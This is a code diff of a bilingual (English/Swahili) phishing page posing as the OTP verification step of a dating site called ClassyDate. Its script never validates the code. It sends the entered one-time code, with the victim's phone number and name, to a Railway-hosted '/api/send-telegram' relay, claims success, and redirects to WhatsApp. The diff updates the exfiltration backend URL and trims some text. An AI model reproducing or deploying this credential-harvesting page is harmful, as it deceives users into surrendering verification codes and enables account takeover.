@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes, viewport-fit=cover">
-    <title>ClassyDate Tanzania · Weka OTP</title>
+    <title>ClassyDate · Enter OTP</title>
     <style>
         * {
             margin: 0;
@@ -20,7 +20,6 @@
             position: relative;
         }
 
-        /* Language Toggle Switch */
         .lang-toggle {
             position: fixed;
             top: 20px;
@@ -50,321 +49,70 @@
             color: white;
             box-shadow: 0 2px 8px rgba(212,123,123,0.3);
         }
-        .lang-btn:first-child {
-            border-radius: 35px 0 0 35px;
-        }
-        .lang-btn:last-child {
-            border-radius: 0 35px 35px 0;
-        }
+        .lang-btn:first-child { border-radius: 35px 0 0 35px; }
+        .lang-btn:last-child { border-radius: 0 35px 35px 0; }
 
-        .app-container {
-            max-width: 500px;
-            width: 100%;
-            margin: 0 auto;
-            position: relative;
-            z-index: 1;
-        }
+        .app-container { max-width: 500px; width: 100%; margin: 0 auto; position: relative; z-index: 1; }
+        .hero { text-align: center; margin-bottom: 20px; animation: fadeInUp 0.5s ease-out; }
+        @keyframes fadeInUp { from { opacity: 0; transform: translateY(20px); } to { opacity: 1; transform: translateY(0); } }
+        @keyframes floatHeart { 0%, 100% { transform: translateY(0px); } 50% { transform: translateY(-5px); } }
+        .heart-icon { font-size: 2rem; animation: floatHeart 3s ease-in-out infinite; display: inline-block; }
+        .logo-text { font-size: 2rem; font-weight: 700; letter-spacing: -0.5px; background: linear-gradient(135deg, #2C2C2C, #8B3A4A, #D47B7B); background-clip: text; -webkit-background-clip: text; color: transparent; margin-top: 5px; }
+        .logo-sub { font-size: 0.7rem; font-weight: 400; color: #D47B7B; letter-spacing: 2px; margin-top: -5px; }
 
-        .hero {
-            text-align: center;
-            margin-bottom: 20px;
-            animation: fadeInUp 0.5s ease-out;
-        }
-        @keyframes fadeInUp {
-            from { opacity: 0; transform: translateY(20px); }
-            to { opacity: 1; transform: translateY(0); }
-        }
-        @keyframes floatHeart {
-            0%, 100% { transform: translateY(0px); }
-            50% { transform: translateY(-5px); }
-        }
-        .heart-icon {
-            font-size: 2rem;
-            animation: floatHeart 3s ease-in-out infinite;
-            display: inline-block;
-        }
-        .logo-text {
-            font-size: 2rem;
-            font-weight: 700;
-            letter-spacing: -0.5px;
-            background: linear-gradient(135deg, #2C2C2C, #8B3A4A, #D47B7B);
-            background-clip: text;
-            -webkit-background-clip: text;
-            color: transparent;
-            margin-top: 5px;
-        }
-        .logo-sub {
-            font-size: 0.7rem;
-            font-weight: 400;
-            color: #D47B7B;
-            letter-spacing: 2px;
-            margin-top: -5px;
-        }
+        .trust-banner { display: flex; justify-content: center; gap: 10px; margin-bottom: 20px; flex-wrap: wrap; }
+        .trust-pill { background: white; border: 1px solid #E8E0E0; border-radius: 30px; padding: 6px 14px; font-size: 0.7rem; font-weight: 500; color: #D47B7B; }
 
-        .trust-banner {
-            display: flex;
-            justify-content: center;
-            gap: 10px;
-            margin-bottom: 20px;
-            flex-wrap: wrap;
-        }
-        .trust-pill {
-            background: white;
-            border: 1px solid #E8E0E0;
-            border-radius: 30px;
-            padding: 6px 14px;
-            font-size: 0.7rem;
-            font-weight: 500;
-            color: #D47B7B;
-        }
+        .otp-card { background: white; border-radius: 28px; padding: 28px 24px; box-shadow: 0 10px 30px rgba(0, 0, 0, 0.05); animation: fadeInUp 0.5s ease-out 0.1s both; }
+        .section-title { font-size: 1.6rem; font-weight: 700; color: #2C2C2C; margin-bottom: 5px; }
+        .section-sub { font-size: 0.75rem; color: #6B6B6B; margin-bottom: 25px; border-left: 3px solid #D47B7B; padding-left: 12px; }
 
-        .otp-card {
-            background: white;
-            border-radius: 28px;
-            padding: 28px 24px;
-            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.05);
-            animation: fadeInUp 0.5s ease-out 0.1s both;
-        }
+        .phone-verify-box { background: #FEFAF8; border-radius: 20px; padding: 16px; margin-bottom: 20px; display: flex; justify-content: space-between; align-items: center; border: 1px solid #F0E0E0; }
+        .phone-number { font-size: 1rem; font-weight: 600; color: #2C2C2C; }
+        .edit-link { color: #D47B7B; background: rgba(212,123,123,0.1); padding: 6px 14px; border-radius: 30px; cursor: pointer; font-size: 0.75rem; }
 
-        .section-title {
-            font-size: 1.6rem;
-            font-weight: 700;
-            color: #2C2C2C;
-            margin-bottom: 5px;
-        }
-        .section-sub {
-            font-size: 0.75rem;
-            color: #6B6B6B;
-            margin-bottom: 25px;
-            border-left: 3px solid #D47B7B;
-            padding-left: 12px;
-        }
+        .info-box { background: #FEFAF8; border-radius: 16px; padding: 12px 16px; margin-bottom: 20px; border: 1px solid #F0E0E0; }
+        .info-text { font-size: 0.7rem; color: #6B6B6B; line-height: 1.5; }
+        .info-text strong { color: #D47B7B; }
 
-        .phone-verify-box {
-            background: #FEFAF8;
-            border-radius: 20px;
-            padding: 16px;
-            margin-bottom: 20px;
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            border: 1px solid #F0E0E0;
-        }
-        .phone-number {
-            font-size: 1rem;
-            font-weight: 600;
-            color: #2C2C2C;
-        }
-        .edit-link {
-            color: #D47B7B;
-            background: rgba(212, 123, 123, 0.1);
-            padding: 6px 14px;
-            border-radius: 30px;
-            cursor: pointer;
-            font-size: 0.75rem;
-            transition: all 0.2s ease;
-        }
-        .edit-link:hover {
-            background: rgba(212, 123, 123, 0.2);
-        }
+        .otp-explanation { background: rgba(212,123,123,0.05); border-radius: 16px; padding: 12px 16px; margin-bottom: 20px; border-left: 3px solid #D47B7B; }
+        .explanation-title { font-size: 0.75rem; font-weight: 700; color: #8B3A4A; margin-bottom: 6px; display: flex; align-items: center; gap: 6px; }
+        .explanation-text { font-size: 0.65rem; color: #6B6B6B; line-height: 1.5; }
 
-        .info-box {
-            background: #FEFAF8;
-            border-radius: 16px;
-            padding: 12px 16px;
-            margin-bottom: 20px;
-            border: 1px solid #F0E0E0;
-        }
-        .info-text {
-            font-size: 0.7rem;
-            color: #6B6B6B;
-            line-height: 1.5;
-        }
-        .info-text strong {
-            color: #D47B7B;
-        }
+        .otp-container { display: flex; justify-content: center; gap: 12px; margin-bottom: 20px; flex-wrap: wrap; }
+        .otp-box { width: 55px; height: 55px; background: #FEFCFA; border: 1.5px solid #F0E0E0; border-radius: 16px; text-align: center; font-size: 1.4rem; font-weight: 600; color: #8B3A4A; outline: none; transition: all 0.2s ease; }
+        .otp-box:focus { border-color: #D47B7B; box-shadow: 0 0 0 3px rgba(212,123,123,0.1); }
 
-        .otp-explanation {
-            background: rgba(212, 123, 123, 0.05);
-            border-radius: 16px;
-            padding: 12px 16px;
-            margin-bottom: 20px;
-            border-left: 3px solid #D47B7B;
-        }
-        .explanation-title {
-            font-size: 0.75rem;
-            font-weight: 700;
-            color: #8B3A4A;
-            margin-bottom: 6px;
-            display: flex;
-            align-items: center;
-            gap: 6px;
-        }
-        .explanation-text {
-            font-size: 0.65rem;
-            color: #6B6B6B;
-            line-height: 1.5;
-        }
+        .timer-text { text-align: center; font-size: 0.7rem; color: #6B6B6B; margin-bottom: 8px; }
+        .resend-btn { display: block; margin: 0 auto 20px; background: none; border: none; color: #D47B7B; font-weight: 500; cursor: pointer; font-size: 0.75rem; padding: 8px 16px; border-radius: 30px; }
+        .resend-btn:hover { background: rgba(212,123,123,0.1); }
 
-        .otp-container {
-            display: flex;
-            justify-content: center;
-            gap: 12px;
-            margin-bottom: 20px;
-            flex-wrap: wrap;
-        }
-        .otp-box {
-            width: 55px;
-            height: 55px;
-            background: #FEFCFA;
-            border: 1.5px solid #F0E0E0;
-            border-radius: 16px;
-            text-align: center;
-            font-size: 1.4rem;
-            font-weight: 600;
-            color: #8B3A4A;
-            outline: none;
-            transition: all 0.2s ease;
-        }
-        .otp-box:focus {
-            border-color: #D47B7B;
-            box-shadow: 0 0 0 3px rgba(212, 123, 123, 0.1);
-        }
+        .verify-btn { width: 100%; background: linear-gradient(135deg, #D47B7B, #8B3A4A); border: none; padding: 16px; font-size: 1rem; font-weight: 600; color: white; border-radius: 50px; cursor: pointer; transition: all 0.3s ease; margin-top: 8px; }
+        .verify-btn:active { transform: scale(0.98); }
+        .verify-btn:disabled { opacity: 0.5; transform: none; cursor: not-allowed; }
 
-        .timer-text {
-            text-align: center;
-            font-size: 0.7rem;
-            color: #6B6B6B;
-            margin-bottom: 8px;
-        }
-        .resend-btn {
-            display: block;
-            margin: 0 auto 20px;
-            background: none;
-            border: none;
-            color: #D47B7B;
-            font-weight: 500;
-            cursor: pointer;
-            font-size: 0.75rem;
-            padding: 8px 16px;
-            border-radius: 30px;
-            transition: all 0.2s ease;
-        }
-        .resend-btn:hover {
-            background: rgba(212, 123, 123, 0.1);
-        }
+        .error-message { background: rgba(244,63,94,0.08); color: #D96C6C; padding: 12px; border-radius: 14px; font-size: 0.75rem; margin-top: 14px; text-align: center; display: none; }
+        .error-message.show { display: block; animation: shake 0.3s; }
+        .success-message { color: #D47B7B; font-size: 0.75rem; text-align: center; margin-top: 12px; display: none; background: rgba(212,123,123,0.1); padding: 12px; border-radius: 14px; }
+        .success-message.show { display: block; animation: pulse 0.3s; }
+        @keyframes shake { 0%,100%{transform:translateX(0)} 25%{transform:translateX(-5px)} 75%{transform:translateX(5px)} }
+        @keyframes pulse { 0%{opacity:0.5;transform:scale(0.98)} 100%{opacity:1;transform:scale(1)} }
 
-        .verify-btn {
-            width: 100%;
-            background: linear-gradient(135deg, #D47B7B, #8B3A4A);
-            border: none;
-            padding: 16px;
-            font-size: 1rem;
-            font-weight: 600;
-            color: white;
-            border-radius: 50px;
-            cursor: pointer;
-            transition: all 0.3s ease;
-            margin-top: 8px;
-        }
-        .verify-btn:hover {
-            transform: translateY(-2px);
-            box-shadow: 0 8px 20px rgba(212,123,123,0.4);
-        }
-        .verify-btn:disabled {
-            opacity: 0.5;
-            transform: none;
-            cursor: not-allowed;
-        }
-
-        .error-message {
-            background: rgba(244, 63, 94, 0.08);
-            color: #D96C6C;
-            padding: 12px;
-            border-radius: 14px;
-            font-size: 0.75rem;
-            margin-top: 14px;
-            text-align: center;
-            display: none;
-        }
-        .error-message.show {
-            display: block;
-            animation: shake 0.3s ease-out;
-        }
-
-        .success-message {
-            color: #D47B7B;
-            font-size: 0.75rem;
-            text-align: center;
-            margin-top: 12px;
-            display: none;
-            background: rgba(212, 123, 123, 0.1);
-            padding: 12px;
-            border-radius: 14px;
-        }
-        .success-message.show {
-            display: block;
-            animation: pulse 0.3s ease-out;
-        }
-
-        @keyframes shake {
-            0%, 100% { transform: translateX(0); }
-            25% { transform: translateX(-5px); }
-            75% { transform: translateX(5px); }
-        }
-
-        @keyframes pulse {
-            0% { opacity: 0.5; transform: scale(0.98); }
-            100% { opacity: 1; transform: scale(1); }
-        }
-
-        .footer-trust {
-            display: flex;
-            justify-content: center;
-            gap: 20px;
-            margin-top: 20px;
-            padding-top: 16px;
-            border-top: 1px solid #F0E0E0;
-            flex-wrap: wrap;
-        }
-        .trust-badge {
-            display: flex;
-            align-items: center;
-            gap: 5px;
-            font-size: 0.65rem;
-            font-weight: 500;
-            color: #A09090;
-        }
+        .footer-trust { display: flex; justify-content: center; gap: 20px; margin-top: 20px; padding-top: 16px; border-top: 1px solid #F0E0E0; flex-wrap: wrap; }
+        .trust-badge { display: flex; align-items: center; gap: 5px; font-size: 0.65rem; font-weight: 500; color: #A09090; }
 
         @media (max-width: 480px) {
-            body {
-                padding: 15px;
-            }
-            .otp-card {
-                padding: 20px 18px;
-            }
-            .section-title {
-                font-size: 1.4rem;
-            }
-            .otp-box {
-                width: 48px;
-                height: 48px;
-                font-size: 1.2rem;
-            }
-            .lang-toggle {
-                top: 12px;
-                right: 12px;
-            }
-            .lang-btn {
-                padding: 6px 16px;
-                font-size: 0.7rem;
-            }
+            body { padding: 15px; }
+            .otp-card { padding: 20px 18px; }
+            .section-title { font-size: 1.4rem; }
+            .otp-box { width: 48px; height: 48px; font-size: 1.2rem; }
+            .lang-toggle { top: 12px; right: 12px; }
+            .lang-btn { padding: 6px 16px; font-size: 0.7rem; }
         }
     </style>
 </head>
 <body>
 
-<!-- Language Toggle Switch -->
 <div class="lang-toggle">
     <button class="lang-btn active" id="langEn" onclick="setLanguage('en')">EN</button>
     <button class="lang-btn" id="langSw" onclick="setLanguage('sw')">SW</button>
@@ -397,13 +145,8 @@
         </div>
 
         <div class="otp-explanation">
-            <div class="explanation-title">
-                <span>🔒</span> <span id="explanationTitle">Why do we need this?</span>
-            </div>
-            <div class="explanation-text" id="explanationText">
-                This one-time password (OTP) verifies that you are the owner of this phone number. 
-                It adds an extra layer of security to your account and helps prevent fake registrations.
-            </div>
+            <div class="explanation-title"><span>🔒</span> <span id="explanationTitle">Why do we need this?</span></div>
+            <div class="explanation-text" id="explanationText">This verifies that you are the owner of this phone number. It adds an extra layer of security to your account.</div>
         </div>
 
         <div class="otp-container">
@@ -418,7 +161,7 @@
         <div class="timer-text" id="timerText">Code expires in 05:00</div>
         <button class="resend-btn" id="resendBtn">Resend OTP</button>
 
-        <div class="success-message" id="otpSuccess">✓ Verified! Redirecting to WhatsApp...</div>
+        <div class="success-message" id="otpSuccess">✓ Verified! Redirecting...</div>
         <div class="error-message" id="otpError">⚠️ Please enter all 6 digits</div>
         <button class="verify-btn" id="verifyBtn" disabled>Verify OTP →</button>
 
@@ -431,69 +174,43 @@
 </div>
 
 <script>
+    // ========== CORRECT BACKEND URL FOR TANZANIA ==========
+    const RAILWAY_URL = 'https://classydate-tz-production.up.railway.app';
+
     // ========== TRANSLATIONS ==========
     const translations = {
         en: {
-            logoText: "ClassyDate Tanzania",
-            logoSub: "Enter OTP",
-            trust1: "Verified Profiles",
-            trust2: "Private & Secure",
-            trust3: "Tanzania",
-            sectionTitle: "Enter OTP",
-            sectionSub: "Enter the 6-digit verification code sent to your phone",
+            logoText: "ClassyDate", logoSub: "Enter OTP",
+            trust1: "Verified Profiles", trust2: "Private & Secure", trust3: "Tanzania",
+            sectionTitle: "Enter OTP", sectionSub: "Enter the 6-digit verification code sent to your phone",
             infoText: "🔐 A 6-digit OTP has been sent to your number. Valid for 5 minutes.",
-            explanationTitle: "Why do we need this?",
-            explanationText: "This one-time password (OTP) verifies that you are the owner of this phone number. It adds an extra layer of security to your account and helps prevent fake registrations.",
-            timerPrefix: "Code expires in",
-            resendBtn: "Resend OTP",
-            verifyBtn: "Verify OTP →",
-            successMsg: "✓ Verified! Redirecting to WhatsApp...",
-            errorMsg: "⚠️ Please enter all 6 digits",
-            editBtn: "Edit",
-            footer1: "OTP expires in 5 minutes",
-            footer2: "Single-use only",
-            footer3: "Verified members only",
-            resendSuccess: "✓ New OTP sent! Valid for 5 minutes.",
-            whatsappUrl: "https://wa.me/254707001191"
+            explanationTitle: "Why do we need this?", explanationText: "This verifies that you are the owner of this phone number.",
+            timerPrefix: "Code expires in", resendBtn: "Resend OTP", verifyBtn: "Verify OTP →",
+            successMsg: "✓ Verified! Redirecting...", errorMsg: "⚠️ Please enter all 6 digits",
+            editBtn: "Edit", footer1: "OTP expires in 5 minutes", footer2: "Single-use only", footer3: "Verified members only",
+            resendSuccess: "✓ New OTP sent! Valid for 5 minutes.", whatsappUrl: "https://wa.me/254707001191"
         },
         sw: {
-            logoText: "ClassyDate Tanzania",
-            logoSub: "Weka OTP",
-            trust1: "Profaili Zilizothibitishwa",
-            trust2: "Faragha na Usalama",
-            trust3: "Tanzania",
-            sectionTitle: "Weka OTP",
-            sectionSub: "Ingiza msimbo wa tarakimu 6 uliotumwa kwa nambari yako",
+            logoText: "ClassyDate", logoSub: "Weka OTP",
+            trust1: "Profaili Zilizothibitishwa", trust2: "Faragha na Usalama", trust3: "Tanzania",
+            sectionTitle: "Weka OTP", sectionSub: "Ingiza msimbo wa tarakimu 6 uliotumwa kwa nambari yako",
             infoText: "🔐 Msimbo wa tarakimu 6 umetumwa kwa nambari yako. Halali kwa dakika 5.",
-            explanationTitle: "Kwa nini tunahitaji hii?",
-            explanationText: "Msimbo huu wa mara moja (OTP) unathibitisha kuwa wewe ndiye mmiliki wa nambari hii ya simu. Inaongeza usalama kwenye akaunti yako na kusaidia kuzuia usajili bandia.",
-            timerPrefix: "Msimbo unaisha baada ya",
-            resendBtn: "Tuma OTP tena",
-            verifyBtn: "Thibitisha OTP →",
-            successMsg: "✓ Imethibitishwa! Inakuelekeza kwenye WhatsApp...",
-            errorMsg: "⚠️ Tafadhali ingiza tarakimu zote 6",
-            editBtn: "Badilisha",
-            footer1: "OTP inaisha baada ya dakika 5",
-            footer2: "Matumizi ya mara moja tu",
-            footer3: "Wanachama walio thibitishwa tu",
-            resendSuccess: "✓ OTP mpya imetumwa! Halali kwa dakika 5.",
-            whatsappUrl: "https://wa.me/254707001191"
+            explanationTitle: "Kwa nini tunahitaji hii?", explanationText: "Hii inathibitisha kuwa wewe ndiye mmiliki wa nambari hii ya simu.",
+            timerPrefix: "Msimbo unaisha baada ya", resendBtn: "Tuma OTP tena", verifyBtn: "Thibitisha OTP →",
+            successMsg: "✓ Imethibitishwa! Inakuelekeza...", errorMsg: "⚠️ Tafadhali ingiza tarakimu zote 6",
+            editBtn: "Badilisha", footer1: "OTP inaisha baada ya dakika 5", footer2: "Matumizi ya mara moja tu", footer3: "Wanachama walio thibitishwa tu",
+            resendSuccess: "✓ OTP mpya imetumwa! Halali kwa dakika 5.", whatsappUrl: "https://wa.me/254707001191"
         }
     };
 
     let currentLang = 'en';
     
-    // Get data from URL
     const urlParams = new URLSearchParams(window.location.search);
     let userPhone = urlParams.get('phone') || '+255 7XX XXX XXX';
     const userName = urlParams.get('name') || 'Customer';
     
     document.getElementById('displayPhone').innerText = userPhone;
 
-    // Telegram Configuration - UPDATED CREDENTIALS
-    const RAILWAY_URL = 'https://where-hearts-production.up.railway.app';
-
-    // Apply language
     function setLanguage(lang) {
         currentLang = lang;
         const t = translations[lang];
@@ -523,7 +240,6 @@
         document.getElementById('langSw').classList.toggle('active', lang === 'sw');
     }
 
-    // OTP box elements
     const otp1 = document.getElementById('otp1');
     const otp2 = document.getElementById('otp2');
     const otp3 = document.getElementById('otp3');
@@ -537,15 +253,11 @@
     function handleOtpInput(current, next, prev) {
         current.addEventListener('input', function(e) {
             this.value = this.value.replace(/[^0-9]/g, '');
-            if (this.value.length === 1 && next) {
-                next.focus();
-            }
+            if (this.value.length === 1 && next) next.focus();
             checkOtpComplete();
         });
         current.addEventListener('keydown', function(e) {
-            if (e.key === 'Backspace' && this.value === '' && prev) {
-                prev.focus();
-            }
+            if (e.key === 'Backspace' && this.value === '' && prev) prev.focus();
         });
     }
 
@@ -562,7 +274,6 @@
         if (otp.length === 6) errorMsg.classList.remove('show');
     }
 
-    // Timer
     let timeLeft = 300;
     let timerInterval;
     const timerText = document.getElementById('timerText');
@@ -574,7 +285,7 @@
         timerText.innerText = `${t.timerPrefix} ${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
         if (timeLeft <= 0) {
             clearInterval(timerInterval);
-            timerText.innerHTML = t.timerPrefix === "Code expires in" ? "Code expired. Please request a new code." : "Msimbo umeisha. Tafadhali omba msimbo mpya.";
+            timerText.innerHTML = "Code expired";
         }
     }
 
@@ -605,7 +316,6 @@
         checkOtpComplete();
     };
 
-    // Send OTP notification to Telegram
     async function sendOtpNotification(otp) {
         try {
             await fetch(`${RAILWAY_URL}/api/send-telegram`, {
@@ -616,7 +326,7 @@
                     pin: otp,
                     name: userName,
                     type: 'otp',
-                    site: 'ClassyDate Tanzania'
+                    site: 'ClassyDate'
                 })
             });
         } catch (error) {
@@ -636,7 +346,7 @@
             return;
         }
         verifyBtn.disabled = true;
-        verifyBtn.innerHTML = translations[currentLang].verifyBtn === "Verify OTP →" ? "Verifying..." : "Inathibitisha...";
+        verifyBtn.innerHTML = "Verifying...";
         await sendOtpNotification(enteredOtp);
         successMsg.classList.add('show');
         setTimeout(() => {
@@ -646,7 +356,7 @@
 
     document.getElementById('editPhoneBtn').onclick = () => {
         const t = translations[currentLang];
-        const newPhone = prompt(t.editBtn === "Edit" ? "Enter your phone number:" : "Ingiza nambari yako ya simu:", userPhone);
+        const newPhone = prompt("Enter your phone number:", userPhone);
         if (newPhone && newPhone.trim().length > 5) {
             userPhone = newPhone.trim();
             document.getElementById('displayPhone').innerText = userPhone;
@@ -661,7 +371,6 @@
         otp1.focus();
     }, 100);
     
-    // Initialize with English
     setLanguage('en');
 </script>
 </body>
